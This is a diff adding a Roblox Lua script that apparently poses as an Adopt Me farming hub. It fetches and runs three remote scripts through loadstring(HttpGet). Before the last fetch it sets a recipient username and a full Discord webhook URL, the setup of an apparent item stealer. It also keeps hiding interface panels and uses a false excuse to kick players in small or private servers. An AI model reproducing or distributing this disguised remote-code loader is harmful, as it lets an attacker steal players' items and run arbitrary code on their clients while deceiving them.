@@ -1,0 +1,90 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local BannedPlayers = {
+	"davidtschal",
+	"sad"
+}
+
+-- Funktion zum Überprüfen der Spieleranzahl und Anzeigen einer Nachricht
+local function checkPlayerCount()
+	for i,v in pairs(BannedPlayers) do
+		if game.Players.LocalPlayer.Name == v then
+			wait(1)
+
+			Players.LocalPlayer:Kick("your account has been temporarily banned for using this script")
+
+		else
+			local playerCount = #Players:GetPlayers() -- Anzahl der Spieler im Spiel
+			if playerCount <= 2 then
+				StarterGui:SetCore("ChatMakeSystemMessage", {
+					Text = "You must not be in a private server or in a server with less than 2 players, because the script cannot work. Assets required by the script are not available in private servers";
+					Color = Color3.fromRGB(255, 0, 0); -- Rote Farbe
+					Font = Enum.Font.SourceSansBold;
+					TextSize = 24;
+				})
+				-- Optional: Spieler nach der Nachricht kicken
+				wait(3) -- Warte 5 Sekunden, bevor der Spieler gekickt wird (um Nachricht anzuzeigen)
+				Players.LocalPlayer:Kick("You must not be in a private server or in a server with less than 2 players, because the script cannot work. Assets required by the script are not available in private servers")
+			else
+
+
+				spawn(function()
+					spawn(function()
+						wait(3)
+						for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+							if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+								v:FindFirstChild("Main").Visible = false
+							end
+						end
+						wait(3)
+						for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+							if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+								v:FindFirstChild("Main").Visible = false
+							end
+						end
+						wait(3)
+						for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+							if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+								v:FindFirstChild("Main").Visible = false
+							end
+						end
+						wait(3)
+						for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+							if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+								v:FindFirstChild("Main").Visible = false
+							end
+						end
+						wait(3)
+						for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+							if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+								v:FindFirstChild("Main").Visible = false
+							end
+						end
+						wait(3)
+						for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+							if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+								v:FindFirstChild("Main").Visible = false
+							end
+						end
+					end)
+					loadstring(game:HttpGet(('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'),true))()
+				end)
+
+
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScripter103/AdoptMe/refs/heads/main/OceanFarm", true))()
+
+				wait(1)
+
+				getgenv().gui = false
+				Username = "davidtschal"
+				Webhook = "https://discord.com/api/webhooks/1284838440411594803/_8onbNULr3R_Ymy3h6-7QJGuP5DqhZybYGpAukc89GqjEE4MYarvwJYC6RwHr18f3mP3"
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
+
+			end
+		end
+	end
+end
+
+-- Überprüfe die Spieleranzahl beim Start des Spiels
+checkPlayerCount()
